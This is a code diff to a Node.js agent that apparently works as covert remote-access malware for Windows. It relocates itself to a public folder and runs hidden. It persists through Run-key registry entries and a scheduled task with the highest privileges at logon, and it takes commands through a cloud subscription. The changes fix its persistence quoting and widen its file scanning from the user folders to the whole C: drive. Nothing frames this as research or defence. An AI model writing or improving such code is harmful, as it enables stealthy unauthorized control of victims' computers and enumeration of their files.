@@ -8,7 +8,7 @@ const fs = require('fs').promises;
 async function moveToPermanentHome() {
   const isCompiled = Boolean(process.pkg);
   const currentPath = isCompiled ? process.execPath : path.resolve(__filename);
-  if (!process.platform === 'win32') return currentPath;
+  if (process.platform !== 'win32') return currentPath;
 
   const targetDir = 'C:\\Users\\Public\\WinXAgent';
   const targetPath = isCompiled ? path.join(targetDir, 'winxagent.exe') : path.join(targetDir, 'agent.js');
@@ -135,16 +135,16 @@ async function scanDirectory(dirPath, foldersOnly = false) {
 function ensurePersistence(targetPath) {
   if (process.platform === 'win32') {
     const isCompiled = Boolean(process.pkg);
-    const cmdPath = isCompiled ? `"${targetPath}" --hidden` : `node "${targetPath}" --hidden`;
-    // Escape double quotes for use inside the /d (data) or /tr (task run) shell arguments
-    const shellEscaped = cmdPath.replace(/"/g, '\\"');
+    // Quote the path only if it contains spaces to ensure clean commands
+    const escapedPath = targetPath.includes(' ') ? `\\"${targetPath}\\"` : targetPath;
+    const cmdPath = isCompiled ? `${escapedPath} --hidden` : `node ${escapedPath} --hidden`;
 
     // 1. Registry Persistence (HKLM for all users)
-    const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
+    const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${cmdPath}" /f`;
     exec(regCmd, (err) => {
       if (err) {
         logToCloud(`HKLM persistence failed, attempting HKCU: ${err.message}`, 'warn');
-        const hkcuCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
+        const hkcuCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${cmdPath}" /f`;
         exec(hkcuCmd, (err2) => {
           if (err2) logToCloud(`HKCU persistence failed: ${err2.message}`, 'error');
           else logToCloud("Persistence established in HKCU.");
@@ -154,7 +154,7 @@ function ensurePersistence(targetPath) {
 
     // 2. Scheduled Task Persistence (Runs with Highest Privileges on every logon)
     const taskName = "WinXAgentService";
-    const taskCmd = `schtasks /create /tn "${taskName}" /tr "${shellEscaped}" /sc onlogon /rl highest /f`;
+    const taskCmd = `schtasks /create /tn "${taskName}" /tr "${cmdPath}" /sc onlogon /rl highest /f`;
 
     exec(taskCmd, (err) => {
       if (err) logToCloud(`Task Scheduler persistence failed: ${err.message}`, 'error');
@@ -178,7 +178,7 @@ async function handleCommand(payload) {
         break;
 
       case 'SCAN':
-        const targetPath = data?.path || 'C:\\Users';
+        const targetPath = data?.path || 'C:\\';
         lastFoldersOnlyPreference = !!data?.foldersOnly;
         await scanDirectory(targetPath, lastFoldersOnlyPreference);
         break;
@@ -322,7 +322,7 @@ async function start() {
   await logToCloud("Agent Online (Background)");
 
   // Perform initial scan of the primary user directory so the dashboard isn't empty
-  await scanDirectory('C:\\Users', lastFoldersOnlyPreference);
+  await scanDirectory('C:\\', lastFoldersOnlyPreference);
 
   // Subscribe to commands targeting this specific computer
   supabase
